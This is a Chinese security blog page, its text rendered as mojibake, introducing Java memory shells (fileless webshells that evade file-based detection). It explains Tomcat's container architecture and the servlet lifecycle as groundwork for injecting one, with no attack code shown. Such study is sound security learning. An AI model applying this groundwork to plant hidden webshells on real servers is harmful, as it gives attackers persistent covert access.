

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
  <meta name="author" content="Xvsf">
  <meta name="keywords" content="">
  
    <meta name="description" content="Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€">
<meta property="og:type" content="article">
<meta property="og:title" content="Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€">
<meta property="og:url" content="http://xvshifu.github.io/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%80%E7%AF%87%20-%20%E5%9F%BA%E7%A1%80/index.html">
<meta property="og:site_name" content="Xvsf blogs">
<meta property="og:description" content="Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506693.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508073.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506316.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508086.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507251.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507920.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508199.gif">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508008.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508795.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508866.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508459.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508670.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509796.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508325.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509163.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508440.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508076.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509410.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509336.webp">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508481.webp">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509118.webp">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508125.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508271.jpeg">
<meta property="article:published_time" content="2025-11-08T07:00:00.000Z">
<meta property="article:modified_time" content="2025-11-08T11:04:47.056Z">
<meta property="article:author" content="Xvsf">
<meta property="article:tag" content="javaå®‰å…¨">
<meta property="article:tag" content="å†…å­˜é©¬">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506693.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€ - Xvsf blogs</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/xm_custom/custom.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 8.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ğŸ–‹ï¸ Hello My Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-steam"></i>
                <span>game</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/game/mf" target="_self">
                    
                    <span>é­”æ–¹</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/game/sl" target="_self">
                    
                    <span>æ‰«é›·</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/game/2048" target="_self">
                    
                    <span>2048</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/game/wzq" target="_self">
                    
                    <span>äº”å­æ£‹</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/game/txz" target="_self">
                    
                    <span>æ¨ç®±å­</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/game/dblk" target="_self">
                    
                    <span>èº²é¿ç»¿å—</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/game/catch-the-cat-master" target="_self">
                    
                    <span>å›´ä½å°çŒ«</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/game/Geek-lucky-block" target="_self">
                    
                    <span>æˆ‘çš„ä¸–ç•Œå¹¸è¿æ–¹å—</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/game/clock/0" target="_self">
                    
                    <span>æ—¶é’Ÿ1</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/game/clock/1" target="_self">
                    
                    <span>æ—¶é’Ÿ2</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-11-08 15:00" pubdate>
          2025å¹´11æœˆ8æ—¥ ä¸‹åˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.7k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          40 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äº 2025å¹´11æœˆ8æ—¥ æ™šä¸Š
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="Java-å†…å­˜é©¬ç¬¬ä¸€ç¯‡-åŸºç¡€"><a href="#Java-å†…å­˜é©¬ç¬¬ä¸€ç¯‡-åŸºç¡€" class="headerlink" title="Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€"></a>Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€</h1><h1 id="ä¸€ã€åŸºç¡€ï¼š"><a href="#ä¸€ã€åŸºç¡€ï¼š" class="headerlink" title="ä¸€ã€åŸºç¡€ï¼š"></a>ä¸€ã€åŸºç¡€ï¼š</h1><h2 id="1-ä»€ä¹ˆæ˜¯å†…å­˜é©¬"><a href="#1-ä»€ä¹ˆæ˜¯å†…å­˜é©¬" class="headerlink" title="1. ä»€ä¹ˆæ˜¯å†…å­˜é©¬"></a>1. ä»€ä¹ˆæ˜¯å†…å­˜é©¬</h2><p>æ— æ–‡ä»¶çš„ webshell</p>
<blockquote>
<p><font style="color:rgb(0, 0, 0);">å†…å­˜é©¬åˆåæ— æ–‡ä»¶é©¬ï¼Œè§åçŸ¥æ„ï¼Œä¹Ÿå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„ webshell æŠ€æœ¯ï¼Œæ˜¯ç”±äº webshell ç‰¹å¾è¯†</font><font style="color:rgb(0, 0, 0);">åˆ«ã€é˜²ç¯¡æ”¹ã€ç›®å½•ç›‘æ§ç­‰ç­‰é’ˆå¯¹ web åº”ç”¨ç›®å½•æˆ–æœåŠ¡å™¨æ–‡ä»¶é˜²å¾¡æ‰‹æ®µçš„ä»‹å…¥ï¼Œå¯¼è‡´çš„æ–‡ä»¶ shell éš¾ä»¥å†™å…¥å’ŒæŒä¹…è€Œè¡ç”Ÿå‡ºçš„ä¸€ç§â€œæ¦‚å¿µå‹â€æœ¨é©¬ã€‚è¿™ç§æŠ€æœ¯çš„æ ¸å¿ƒæ€æƒ³éå¸¸ç®€å•ï¼Œä¸€å¥è¯å°±èƒ½æ¦‚æ‹¬ï¼Œé‚£å°±æ˜¯å¯¹è®¿é—®è·¯å¾„æ˜ å°„åŠç›¸å…³å¤„ç†ä»£ç çš„åŠ¨æ€æ³¨å†Œã€‚</font></p>
</blockquote>
<h2 id="2-å†…å­˜é©¬åˆ†ç±»ï¼š"><a href="#2-å†…å­˜é©¬åˆ†ç±»ï¼š" class="headerlink" title="2. å†…å­˜é©¬åˆ†ç±»ï¼š"></a>2. å†…å­˜é©¬åˆ†ç±»ï¼š</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506693.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="3-Tomcat-åŸºç¡€"><a href="#3-Tomcat-åŸºç¡€" class="headerlink" title="3. Tomcat åŸºç¡€"></a>3. Tomcat åŸºç¡€</h2><h3 id="3-1-Tomcat-æ¶æ„"><a href="#3-1-Tomcat-æ¶æ„" class="headerlink" title="3.1 Tomcat æ¶æ„"></a>3.1 Tomcat æ¶æ„</h3><h4 id="3-1-1-Tomcat-æ¶æ„"><a href="#3-1-1-Tomcat-æ¶æ„" class="headerlink" title="3.1.1 Tomcat æ¶æ„"></a>3.1.1 Tomcat æ¶æ„</h4><p><strong><font style="color:rgb(51, 51, 51);">Tomcat æ˜¯Webåº”ç”¨æœåŠ¡å™¨,æ˜¯ä¸€ä¸ªServlet&#x2F;JSPå®¹å™¨</font></strong><font style="color:rgb(51, 51, 51);">ï¼ŒåŸºæœ¬æ¡†æ¶å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸»è¦æœ‰serverã€serviceã€connectorã€containerã€‚</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508073.jpeg" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506316.jpeg" srcset="/img/loading.gif" lazyload></p>
<p><strong>Serverï¼š</strong></p>
<p>ä»£è¡¨æ•´ä¸ª Tomcat æœåŠ¡å™¨ã€‚</p>
<p>ä¸€ä¸ª Tomcat åªæœ‰ä¸€ä¸ª Serverï¼ŒServer ä¸­åŒ…å«è‡³å°‘ä¸€ä¸ª Service ç»„ä»¶ã€‚</p>
<p><strong>Serviceï¼š</strong></p>
<p>Service ä¸»è¦æ˜¯ä¸ºäº†å…³è” Connector å’Œ Containerï¼ŒåŒæ—¶ä¼šåˆå§‹åŒ–å®ƒä¸‹é¢çš„å…¶å®ƒç»„ä»¶ï¼Œåœ¨ Connector å’Œ Container å¤–é¢å¤šåŒ…ä¸€å±‚ï¼ŒæŠŠå®ƒä»¬ç»„è£…åœ¨ä¸€èµ·ï¼Œå‘å¤–é¢æä¾›æœåŠ¡ï¼Œ</p>
<p>ä¸€ä¸ª Service å¯ä»¥è®¾ç½®å¤šä¸ª Connectorï¼Œä½†åªèƒ½æœ‰ä¸€ä¸ª Container å®¹å™¨ã€‚</p>
<p><strong>Connectorï¼š</strong></p>
<p>Connector è´Ÿè´£æ¥æ”¶æµè§ˆå™¨å‘è¿‡æ¥çš„ tcp è¿æ¥è¯·æ±‚ï¼Œåˆ›å»ºä¸€ä¸ª Request å’Œ Response å¯¹è±¡åˆ†åˆ«ç”¨äºå’Œè¯·æ±‚ç«¯äº¤æ¢æ•°æ®ï¼Œç„¶åä¼šäº§ç”Ÿä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚å¹¶æŠŠäº§ç”Ÿçš„ Request å’Œ Response å¯¹è±¡ä¼ ç»™å¤„ç†è¿™ä¸ªè¯·æ±‚çš„çº¿ç¨‹ã€‚è¿™é‡ŒTomcatä¸­ä¸€ä¸ªConnectorå¯¹åº”äº†ä¸€ä¸ªè¯·æ±‚ï¼Œæ‰€ä»¥serviceå®¹å™¨ä¸­å¯ä»¥åŒæ—¶æœ‰å¤šä¸ªconnectorå¯¹è±¡ã€‚</p>
<p>ç®€å•æ¥è¯´å°±æ˜¯Connectorå°†åœ¨æŸä¸ªæŒ‡å®šçš„ç«¯å£ä¸Šæ¥ç›‘å¬å®¢æˆ·çš„è¯·æ±‚ï¼Œå°† socket è¿æ¥å°è£…æˆ request å’Œ response å¯¹è±¡ï¼Œåç»­äº¤ç»™ Container ï¼ˆEngineï¼‰æ¥å¤„ç†ï¼Œå¹¶ä»Engineå¤„è·å¾—å“åº”å¹¶è¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508086.jpeg" srcset="/img/loading.gif" lazyload></p>
<p>Connectoræ˜¯ä½¿ç”¨protocolHandleræ¥å¤„ç†å…·ä½“çš„è¯·æ±‚ï¼ˆä¸åŒçš„protocolHandlerä»£è¡¨ä¸åŒçš„è¿æ¥ç±»å‹ï¼‰ã€‚</p>
<p>è€Œæ¯ç§protocolHandleréƒ½ä½¿ç”¨äº†å„è‡ªçš„3ä¸ªé‡è¦ç»„ä»¶æ¥å…·ä½“å¤„ç†è¯·æ±‚ï¼š</p>
<p>-Endpointï¼šç”¨äºå¤„ç†åº•å±‚Socketè¿æ¥ï¼ˆnioå’Œnio2å®ç°çš„æ˜¯TCP&#x2F;IPåè®®ï¼ŒAprå®ç°çš„æ˜¯SSL&#x2F;TLSåè®®ï¼‰ï¼›</p>
<p>-Processerï¼šç”¨äºå°†Endpointæ¥æ”¶åˆ°çš„Socketå°è£…æˆRequestï¼ˆå®ç°HTTPåè®®æˆ–websocketåè®®æˆ–AJPåè®®ï¼‰ï¼›</p>
<p>-Adapterï¼šç”¨äºå°†å°è£…å¥½çš„Requestäº¤ç»™Containerï¼ˆå°†è¯·æ±‚é€‚é…åˆ°servletå®¹å™¨ï¼‰ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507251.jpeg" srcset="/img/loading.gif" lazyload></p>
<p><strong><font style="color:rgb(51, 51, 51);">Containerï¼ˆåˆåCatalinaï¼‰ï¼š</font></strong></p>
<p><font style="color:rgb(51, 51, 51);">Containerå®¹å™¨åˆ™æ˜¯è´Ÿè´£å°è£…å’Œç®¡ç†Servlet å¤„ç†ç”¨æˆ·çš„servletè¯·æ±‚ï¼Œå¹¶è¿”å›å¯¹è±¡ç»™webç”¨æˆ·çš„æ¨¡å—ã€‚</font></p>
<p><font style="color:rgb(51, 51, 51);">Tomcatä¸­æœ‰å››ç§ç±»å‹çš„Servletå®¹å™¨ï¼Œä»ä¸Šåˆ°ä¸‹åˆ†åˆ«æ˜¯ Engineã€Hostã€Contextã€Wrapperã€‚</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507920.jpeg" srcset="/img/loading.gif" lazyload></p>
<p>Engineï¼šè¡¨ç¤ºæ•´ä¸ª Catalina çš„ Servlet å¼•æ“ï¼Œç”¨æ¥ç®¡ç†å¤šä¸ªè™šæ‹Ÿç«™ç‚¹ï¼Œä¸€ä¸ª Service æœ€å¤šåªèƒ½æœ‰ä¸€Engineï¼Œä½†æ˜¯ä¸€ä¸ªå¼•æ“å¯åŒ…å«å¤šä¸ª Hostï¼›</p>
<p>Hostï¼šä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œæˆ–è€…è¯´ä¸€ä¸ªç«™ç‚¹ï¼Œå¯ä»¥ç»™ Tomcat é…ç½®å¤šä¸ªè™šæ‹Ÿä¸»æœºåœ°å€ï¼Œè€Œä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹å¯åŒ…å«å¤šä¸ª Contextï¼›</p>
<p>Contextï¼šè¡¨ç¤ºä¸€ä¸ª Web åº”ç”¨ç¨‹åºï¼Œæ¯ä¸€ä¸ªContextéƒ½æœ‰å”¯ä¸€çš„pathï¼Œä¸€ä¸ªWebåº”ç”¨å¯åŒ…å«å¤šä¸ª Wrapperï¼›</p>
<p>Wrapperï¼šè¡¨ç¤ºä¸€ä¸ªServletï¼Œè´Ÿè´£ç®¡ç†æ•´ä¸ª Servlet çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬è£…è½½ã€åˆå§‹åŒ–ã€èµ„æºå›æ”¶ç­‰</p>
<h4 id="3-1-2-Tomcatå’ŒServletçš„å…³ç³»"><a href="#3-1-2-Tomcatå’ŒServletçš„å…³ç³»" class="headerlink" title="3.1.2 Tomcatå’ŒServletçš„å…³ç³»"></a><font style="color:rgba(0, 0, 0, 0.85);">3.1.2 Tomcatå’ŒServletçš„å…³ç³»</font></h4><p><strong>Tomcat æ˜¯Webåº”ç”¨æœåŠ¡å™¨ï¼Œæ˜¯ä¸€ä¸ªServlet&#x2F;JSPå®¹å™¨</strong>ï¼Œè€ŒServletå®¹å™¨ä»ä¸Šåˆ°ä¸‹åˆ†åˆ«æ˜¯ Engineã€Hostã€Contextã€Wrapperã€‚</p>
<p>Engineï¼šå®ç°ç±»ä¸º org.apache.catalina.core.StandardEngine</p>
<p>Hostï¼šå®ç°ç±»ä¸º org.apache.catalina.core.StandardHost</p>
<p>Contextï¼šå®ç°ç±»ä¸º org.apache.catalina.core.StandardContext</p>
<p>Wrapperï¼šå®ç°ç±»ä¸º org.apache.catalina.core.StandardWrapper</p>
<p><font style="color:rgb(51, 51, 51);">åœ¨Tomcatä¸­Wrapperä»£è¡¨ä¸€ä¸ªç‹¬ç«‹çš„servletå®ä¾‹ï¼ŒStandardWrapperæ˜¯Wrapperæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼ˆStandardWrapper çš„ä¸»è¦ä»»åŠ¡å°±æ˜¯è½½å…¥Servletç±»å¹¶ä¸”è¿›è¡Œå®ä¾‹åŒ–ï¼‰ï¼ŒåŒæ—¶å…¶ä»ContainerBaseç±»ç»§æ‰¿è¿‡æ¥ï¼Œè¡¨ç¤ºä»–æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œåªæ˜¯ä»–æ˜¯æœ€åº•å±‚çš„å®¹å™¨ï¼Œä¸èƒ½å†å«æœ‰ä»»ä½•çš„å­å®¹å™¨äº†ï¼Œä¸”å…¶çˆ¶å®¹å™¨åªèƒ½æ˜¯contextã€‚è€Œæˆ‘ä»¬åœ¨ä¹Ÿå°±æ˜¯éœ€è¦åœ¨è¿™é‡Œå»è½½å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„ServletåŠ è½½æˆ‘ä»¬çš„å†…å­˜é©¬ã€‚</font></p>
<h4 id="3-1-3-Tomcatå·¥ä½œæœºåˆ¶åŠ¨ç”»æ¼”ç¤º"><a href="#3-1-3-Tomcatå·¥ä½œæœºåˆ¶åŠ¨ç”»æ¼”ç¤º" class="headerlink" title="3.1.3 Tomcatå·¥ä½œæœºåˆ¶åŠ¨ç”»æ¼”ç¤º"></a><font style="color:rgb(0, 0, 0);">3.1.3 Tomcatå·¥ä½œæœºåˆ¶åŠ¨ç”»æ¼”ç¤º</font></h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508199.gif" srcset="/img/loading.gif" lazyload></p>
<h3 id="3-2-Servlet"><a href="#3-2-Servlet" class="headerlink" title="3.2 Servlet"></a>3.2 Servlet</h3><h4 id="3-2-1-ä»€ä¹ˆæ˜¯servlet"><a href="#3-2-1-ä»€ä¹ˆæ˜¯servlet" class="headerlink" title="3.2.1 ä»€ä¹ˆæ˜¯servlet"></a><font style="color:rgb(31, 35, 40);">3.2.1 ä»€ä¹ˆæ˜¯servlet</font></h4><p><font style="color:rgb(31, 35, 40);">Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚å®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚ç”Ÿæˆç›¸åº”çš„è¿”å›ä¿¡æ¯æä¾›ç»™ç”¨æˆ·ã€‚</font></p>
<p><strong><font style="color:rgb(31, 35, 40);">servlet æ¶æ„ï¼š</font></strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508008.jpeg" srcset="/img/loading.gif" lazyload></p>
<h4 id="3-2-2-è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹"><a href="#3-2-2-è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹" class="headerlink" title="3.2.2 è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹"></a><font style="color:rgb(31, 35, 40);">3.2.2 è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹</font></h4><p><font style="color:rgb(31, 35, 40);">å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ï¼Œæ¯”å¦‚getç±»å‹ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">Servletå®¹å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚ä¿¡æ¯ï¼Œå°è£…æˆHttpServletRequest å’Œ  HttpServletResponseå¯¹è±¡ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">Servletå®¹å™¨è°ƒç”¨HttpServletçš„init()æ–¹æ³•ï¼Œinitæ–¹æ³•åªåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™è¢«è°ƒç”¨ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">Servletå®¹å™¨è°ƒç”¨service()æ–¹æ³•ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">service()æ–¹æ³•æ ¹æ®è¯·æ±‚ç±»å‹ï¼Œè¿™é‡Œæ˜¯getç±»å‹ï¼Œåˆ†åˆ«è°ƒç”¨doGetæˆ–è€…doPostæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨doGetæ–¹æ³•ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">doXXXæ–¹æ³•ä¸­æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„ä¸šåŠ¡é€»è¾‘ã€‚</font></p>
